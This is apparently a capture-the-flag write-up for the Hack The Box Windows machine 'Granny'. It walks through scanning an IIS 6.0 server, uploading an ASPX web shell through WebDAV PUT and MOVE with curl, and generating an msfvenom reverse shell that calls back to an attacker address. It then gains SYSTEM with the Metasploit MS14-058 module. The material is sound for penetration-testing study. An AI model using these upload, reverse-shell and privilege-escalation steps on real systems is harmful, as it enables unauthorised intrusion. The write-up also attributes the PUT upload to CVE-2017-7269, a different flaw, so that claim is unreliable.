
Granny is an easy Windows OS box, which can be exploited using several different methods. In this write-up I will be following the intended method of pwning this box. 

In order to gain remote access to the target machine I will exploit the `PUT` method in the WebDAV extension of the HTTP protocol. This vulnerability exists in IIS 6.0 (CVE-2017-7269) when WebDEV improperly handles objects in the memory, which could allow an attacker to run arbitrary code on the target machine.

For privilege escalation I will exploit the "NULL Pointer Dereference" vulnerability (CVE-2014-4113) which exists in Windows kernel mode driver `win32k.sys` and allows local users to gain privileges.

---

## Reconnaissance
 - Discover open ports.
 - Detect exposed services and their versions running on open ports.

### Initial Port Scan
Perform a comprehensive port scan to find the open ones on the target machine by scanning all ports.
```shell
root@kali# rustscan -a 10.10.10.15 -r 0-65535 -b 1000 -u 5000 -- -Pn
```

Port scan result:
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.15:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -Pn" on ip 10.10.10.15
Depending on the complexity of the script, results may take some time to appear.
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 12:40 IST
Initiating Parallel DNS resolution of 1 host. at 12:40
Completed Parallel DNS resolution of 1 host. at 12:40, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:40
Scanning 10.10.10.15 [1 port]
Discovered open port 80/tcp on 10.10.10.15
Completed Connect Scan at 12:40, 0.15s elapsed (1 total ports)
Nmap scan report for 10.10.10.15
Host is up, received user-set (0.15s latency).
Scanned at 2023-09-25 12:40:35 IST for 0s

PORT   STATE SERVICE REASON
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds
Exposed Services
Identify services running on the open ports.
```

### Service and Version Detection
Detect all running services and their versions by running a script scan on all open ports found.
```shell
root@kali# rustscan -a 10.10.10.15 -p 80 -u 5000 -- -sC -sV
```

Script scan result:
```shell
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢

[~] The config file is expected to be at "/home/superuser/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
Open 10.10.10.15:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sC -sV" on ip 10.10.10.15
Depending on the complexity of the script, results may take some time to appear.
[~] Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-25 12:43 IST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Initiating Ping Scan at 12:43
Scanning 10.10.10.15 [2 ports]
Completed Ping Scan at 12:43, 0.15s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:43
Completed Parallel DNS resolution of 1 host. at 12:43, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 3, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:43
Scanning 10.10.10.15 [1 port]
Discovered open port 80/tcp on 10.10.10.15
Completed Connect Scan at 12:43, 0.15s elapsed (1 total ports)
Initiating Service scan at 12:43
Scanning 1 service on 10.10.10.15
Completed Service scan at 12:43, 6.41s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.15.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 5.11s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.63s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Nmap scan report for 10.10.10.15
Host is up, received syn-ack (0.15s latency).
Scanned at 2023-09-25 12:43:31 IST for 12s

PORT   STATE SERVICE REASON  VERSION
80/tcp open  http    syn-ack Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Server Date: Mon, 25 Sep 2023 07:13:39 GMT
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT POST
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:43
Completed NSE at 12:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.65 seconds
```

### Analysis
The scan results show that one port is found to be open which is 80, hence this is the only entry point to the box. The port is running Miscrosoft Windows IIS 6.0 which is an outdated version and is using the WebDEV extension of the HTTP protocol. One thing that pops out right away are the allowed HTTP methods. These methods could potentially allow to add, delete and move files on the web server.

## Enumeration
- Visit port 80 via a browser.
- Brute-force common directories and files.

### Web Application
Visit the web application on port 80.

![Web Application](https://github.com/karanshergill/Hack-the-Box/assets/83878909/a7f3ba74-df96-4268-a904-fe6ee6d7d880)
The web application just says “Under Construction”.

### Response Headers
Inspect the response headers for some useful information.

```http
HTTP/1.1 200 OK
Content-Length: 1433
Content-Type: text/html
Content-Location: http://10.10.10.15/iisstart.htm
Last-Modified: Fri, 21 Feb 2003 15:48:30 GMT
Accept-Ranges: bytes
ETag: "05b3daec0d9c21:38e"
Server: Microsoft-IIS/6.0
MicrosoftOfficeWebServer: 5.0_Pub
X-Powered-By: ASP.NET
Date: Tue, 26 Sep 2023 08:08:13 GMT
```
The `X-Powered-By: ASP.NET` indicates that `aspx` files may get executed if I can somehow upload one on the server.

### Content Discovery
Brute-force directories and files.

```shell
root@kali# feroxbuster -u http://10.10.10.15 -w /usr/share/wordlists/ctf-wordlist.txt -s 200 -n
```
Brute-force result:
```shell
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.10.15
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/ctf-wordlist.txt
 👌  Status Codes          │ [200]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🚫  Do Not Recurse        │ true
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l       23w     3080c http://10.10.10.15/pagerror.gif
200      GET       39l      159w     1433c http://10.10.10.15/
[####################] - 60s    17778/17778   0s      found:2       errors:17764  
[####################] - 60s    17770/17770   298/s   http://10.10.10.15/  
```
Looking into the directories and files that `feroxbuster` found, nothing useful came up.

## WebDAV
Web Distributed Authoring and Versioning or WebDAV is a protocol whose basic functionality includes enabling users to share, copy, move and edit files through a web server.

This could potentially give us the ability to save files on the web server. Especially an `aspx` file as it was mentioned in the response headers.

### Exploration
I will use the `davtest` tool to find out what types of files can be uploaded, and can a directory be created on the server.

```shell
root@kali# davtest --url http://10.10.10.15

********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://10.10.10.15
********************************************************
NOTE    Random string for this session: lOl40HHuEoYCr
********************************************************
 Creating directory
MKCOL           SUCCEED:                Created http://10.10.10.15/DavTestDir_lOl40HHuEoYCr
********************************************************
 Sending test files
PUT     aspx    FAIL
PUT     php     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.php
PUT     cfm     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.cfm
PUT     html    SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
PUT     cgi     FAIL
PUT     jhtml   SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jhtml
PUT     txt     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
PUT     asp     FAIL
PUT     pl      SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.pl
PUT     jsp     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jsp
PUT     shtml   FAIL
********************************************************
 Checking for test file execution
EXEC    php     FAIL
EXEC    cfm     FAIL
EXEC    html    SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
EXEC    html    FAIL
EXEC    jhtml   FAIL
EXEC    txt     SUCCEED:        http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
EXEC    txt     FAIL
EXEC    pl      FAIL
EXEC    jsp     FAIL

********************************************************
/usr/bin/davtest Summary:
Created: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.php
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.cfm
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jhtml
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.pl
PUT File: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.jsp
Executes: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.html
Executes: http://10.10.10.15/DavTestDir_lOl40HHuEoYCr/davtest_lOl40HHuEoYCr.txt
```
The results show that a lot of file types can be uploaded but not `asp` or `aspx`, which are of my interest. However, `txt` and `html` files are allowed and can be uploaded.

#### Manual
Remember that `PUT` is not the only method that is allowed. I also can use the `MOVE` method. The `MOVE` HTTP method not only can be used to change the location of a file on the web server, but it can also be used to rename files.

I will try to upload a file with `.txt` extension with `curl`. Once the text file is uploaded onto the server I will change the file extension to `.aspx`

Create and Upload:
```shell
echo "PwnStuff" > test.txt
root@kali# curl -X PUT http://10.10.10.15/test.txt -d @test.txt
root@kali# curl http://10.10.10.15/test.txt
```

Change Extension:
```shell
root@kali# curl -X MOVE -H 'Destination:http://10.10.10.15/test.aspx' http://10.10.10.15/test.txt
root@kali# curl http://10.10.10.15/test.aspx
```

Success:
![img](https://user-images.githubusercontent.com/83878909/270296381-2bc4a9ea-988a-43b5-b152-014075609db5.png)

### Web Shell
I will use an `aspx` web shell from `/usr/share/webshells/aspx/cmdasp.aspx`:
```shell
root@kali# cp /usr/share/webshells/aspx/cmdasp.aspx .
root@kali# mv cmdasp.aspx revsh.txt
```

Upload and rename the extension of the web shell:
```shell
root@kali# curl -X PUT http://10.10.10.15/revsh.txt --data-binary @revsh.txt
root@kali# curl -X MOVE -H 'Destination:http://10.10.10.15/revsh.aspx' http://10.10.10.15/revsh.txt
```

Access the web shell:
![img](https://user-images.githubusercontent.com/83878909/270300015-9f945906-a62a-457b-b743-641e12ce5ae8.png)

## Initial Foothold
Since it is now confirmed that ASPX code can be successfully uploaded and executed on the web server. I will upload a reverse shell to gain a foothold.

### Reverse Shell as Netwrok Service
Generate an `aspx` reverse shell and upload it onto the web server.

#### MSFVenom
```shell
root@kali# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.10 LPORT=443 -f aspx > shell.aspx
```
![img](https://user-images.githubusercontent.com/83878909/270320264-c3c4c830-1a83-4773-9a6a-04f9665547a5.png)

```shell
curl -X PUT http://10.10.10.15/shell.txt --data-binary @shell.aspx
curl -X MOVE -H 'Destination: http://10.10.10.15/shell.aspx' http://10.10.10.15/shell.txt
```

#### Meterpreter
Start MSFConsole and setup listener.
```shell
root@kali# msfconsole
                                                  
     ,           ,
    /             \
   ((__---,,,---__))
      (_) O O (_)_________
         \ _ /            |\
          o_o \   M S F   | \
               \   _____  |  *
                |||   WW|||
                |||     |||


       =[ metasploit v6.3.19-dev                          ]
+ -- --=[ 2318 exploits - 1215 auxiliary - 412 post       ]
+ -- --=[ 1234 payloads - 46 encoders - 11 nops           ]
+ -- --=[ 9 evasion                                       ]

Metasploit tip: Use the edit command to open the 
currently active module in your editor
Metasploit Documentation: https://docs.metasploit.com/

msf6>
msf6 > use exploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST tun0
LHOST => tun0
msf6 exploit(multi/handler) > set lport 443
lport => 443
msf6 exploit(multi/handler) > options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     tun0             yes       The listen address (an interface may be specified)
   LPORT     443              yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target



View the full module info with the info, or info -d command.

msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 10.10.14.10:443 
```

Trigger the uploaded reverse shell:
![img](https://user-images.githubusercontent.com/83878909/270324458-aaa22746-a494-4471-8044-c74d1bc4be6e.png)

```shell
[*] Started reverse TCP handler on 10.10.14.10:443 
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 1 opened (10.10.14.10:443 -> 10.10.10.15:1031) at 2023-09-25 16:50:33 +0530
```
I get a shell! Unfortunately, I don’t have permission to view the user.txt flag, so I need to escalate privileges.

## Privilege Escalation
I will use the `local-exploit-suggester` module to identify any missing patches on the box which potentially allows me to escalate privileges my permissions on the box.

### Exploit Suggester
```shell
msf6> background
[*] Backgrounding session 1..
msf6 exploit(multi/handler) > search local_exploit_suggester

Matching Modules
================

   #  Name                                      Disclosure Date  Rank    Check  Description
   -  ----                                      ---------------  ----    -----  -----------
   0  post/multi/recon/local_exploit_suggester                   normal  No     Multi Recon Local Exploit Suggester


Interact with a module by name or index. For example info 0, use 0 or use post/multi/recon/local_exploit_suggester

msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set session 1
session => 1
msf6 post(multi/recon/local_exploit_suggester) > run

[*] 10.10.10.15 - Collecting local exploits for x86/windows...
[*] 10.10.10.15 - 186 exploit checks are being tried...
[+] 10.10.10.15 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms14_070_tcpip_ioctl: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.10.10.15 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.10.10.15 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Running check method for exploit 41 / 41
[*] 10.10.10.15 - Valid modules for session 2:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/ms10_015_kitrap0d                        Yes                      The service is running, but could not be validated.
 2   exploit/windows/local/ms14_058_track_popup_menu                Yes                      The target appears to be vulnerable.
 3   exploit/windows/local/ms14_070_tcpip_ioctl                     Yes                      The target appears to be vulnerable.
 4   exploit/windows/local/ms15_051_client_copy_image               Yes                      The target appears to be vulnerable.
 5   exploit/windows/local/ms16_016_webdav                          Yes                      The service is running, but could not be validated.
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
 7   exploit/windows/local/ppr_flatten_rec                          Yes                      The target appears to be vulnerable.
 8   exploit/windows/local/adobe_sandbox_adobecollabsync            No                       Cannot reliably check exploitability.
 9   exploit/windows/local/agnitum_outpost_acs                      No                       The target is not exploitable.
 10  exploit/windows/local/always_install_elevated                  No                       The target is not exploitable.

<-- SNIP -->

[*] Post module execution completed
msf6 post(multi/recon/local_exploit_suggester) >
```
I will use the second exploit second one **MS14–058** (`ms14_058_track_popup_menu`).

### MS14-058
A privilege escalation vulnerability (CVE-2014-4113) allows an attacker to run arbitrary code in kernel mode due to the kernel-mode driver improperly handling objects in memory.

```shell
msf6 post(multi/recon/local_exploit_suggester) > use exploit/windows/local/ms14_058_track_popup_menu
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/ms14_058_track_popup_menu) > options

Module options (exploit/windows/local/ms14_058_track_popup_menu):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.1.27     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86



View the full module info with the info, or info -d command.

msf6 exploit(windows/local/ms14_058_track_popup_menu) > set session 1
session => 1
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set lhost 10.10.14.10
lhost => 10.10.14.10
msf6 exploit(windows/local/ms14_058_track_popup_menu) > set lport 4444
lport => 4444

msf6 exploit(windows/local/ms14_058_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.14.10:4444 
[*] Reflectively injecting the exploit DLL and triggering the exploit...
[*] Launching msiexec to host the DLL...
[+] Process 2504 launched.
[*] Reflectively injecting the DLL into 2504...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (175686 bytes) to 10.10.10.15
[*] Meterpreter session 2 opened (10.10.14.10:4444 -> 10.10.10.15:1032) at 2023-09-25 17:04:16 +0530

meterpreter > ls
Listing: c:\Documents and Settings
==================================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2017-04-13 00:18:10 +0530  Administrator
040777/rwxrwxrwx  0     dir   2017-04-12 19:33:34 +0530  All Users
040777/rwxrwxrwx  0     dir   2017-04-12 19:34:48 +0530  Default User
040777/rwxrwxrwx  0     dir   2017-04-13 00:49:46 +0530  Lakis
040777/rwxrwxrwx  0     dir   2017-04-12 19:38:32 +0530  LocalService
040777/rwxrwxrwx  0     dir   2017-04-12 19:38:31 +0530  NetworkService
```

#### Check Privileges
```shell
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

---

## Conclusion
Initial Foothold:
- Insecure configuration of the web server that allowed me to upload arbitrary files using the HTTP methods ‘PUT’ and ‘MOVE’. This would not have been possible if the HTTP methods were disabled.

Privilege Escalation:
- A Kernel vulnerability in the windows operating system. This could have been avoided if the OS was patched.

_**That's all folks for this box!**_
